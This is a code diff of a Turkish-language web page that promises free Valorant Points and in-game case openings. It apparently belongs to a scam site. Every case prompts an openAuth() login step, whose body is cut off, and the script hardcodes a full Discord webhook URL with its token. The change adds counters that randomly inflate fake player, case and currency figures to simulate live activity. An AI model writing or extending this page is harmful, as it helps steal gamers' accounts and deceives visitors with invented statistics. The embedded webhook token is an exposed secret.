@@ -43,9 +43,9 @@
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
         .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
 
-        /* İstatistikler */
+        /* Alt İstatistikler (Fixlendi) */
         .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); }
-        .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
+        .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; min-width: 120px; }
     </style>
 </head>
 <body>
@@ -84,15 +84,14 @@
     </div>
 
     <div class="live-stats">
-        <div class="stat-box"><span class="stat-num">2.841</span><span style="color:#555; font-size:12px; font-weight:800;">AKTİF OYUNCU</span></div>
-        <div class="stat-box"><span class="stat-num">148.209</span><span style="color:#555; font-size:12px; font-weight:800;">KASA AÇILDI</span></div>
-        <div class="stat-box"><span class="stat-num">1.250.400</span><span style="color:#555; font-size:12px; font-weight:800;">VP DAĞITILDI</span></div>
+        <div class="stat-box"><span class="stat-num" id="stat-players">2,841</span><span style="color:#555; font-size:12px; font-weight:800;">AKTİF OYUNCU</span></div>
+        <div class="stat-box"><span class="stat-num" id="stat-cases">148,209</span><span style="color:#555; font-size:12px; font-weight:800;">KASA AÇILDI</span></div>
+        <div class="stat-box"><span class="stat-num" id="stat-vp">1,250,400</span><span style="color:#555; font-size:12px; font-weight:800;">VP DAĞITILDI</span></div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";
 
-        // TÜM SİSTEMİ ÇALIŞTIRAN ANA FONKSİYON
         window.addEventListener('load', function() {
             
             // 1. Skin Drop Sistemi
@@ -102,7 +101,6 @@
                 {img: "skin5.png", color: "#ff4655"}
             ];
             const track = document.getElementById('dropTrack');
-            
             function addNewDrop() {
                 if(!track) return;
                 const randomSkin = skins[Math.floor(Math.random() * skins.length)];
@@ -115,16 +113,14 @@
             }
             addNewDrop();
 
-            // 2. Kasa Yükleme Sistemi
+            // 2. Kasa Yükleme
             const cases = [
                 {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
                 {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
                 {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
             ];
-            
             const r1 = document.getElementById('row1');
             const r2 = document.getElementById('row2');
-
             if(r1 && r2) {
                 cases.slice(0, 4).forEach(c => {
                     r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
@@ -134,21 +130,32 @@
                 });
             }
 
-            // 3. Sayaç Sistemi (Donmayan Versiyon)
+            // 3. Çekiliş Sayacı
             function updateCounter() {
                 const now = new Date();
                 const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
                 let t = new Date(utc3); t.setHours(24, 0, 0, 0);
                 let d = t - utc3;
-                
                 if (d < 0) d += 86400000;
-
                 let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
                 const el = document.getElementById('countdown');
                 if(el) el.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
             }
             setInterval(updateCounter, 1000);
             updateCounter();
+
+            // 4. Alt İstatistikler Sayaç Mekanizması (YENİ eklendi)
+            let players = 2841, casesOpened = 148209, vpDistributed = 1250400;
+            function updateStats() {
+                players += Math.floor(Math.random() * 5) - 2;
+                casesOpened += Math.floor(Math.random() * 3);
+                vpDistributed += Math.floor(Math.random() * 100);
+                
+                document.getElementById('stat-players').innerText = players.toLocaleString();
+                document.getElementById('stat-cases').innerText = casesOpened.toLocaleString();
+                document.getElementById('stat-vp').innerText = vpDistributed.toLocaleString();
+            }
+            setInterval(updateStats, 3000);
         });
 
         function openAuth() {
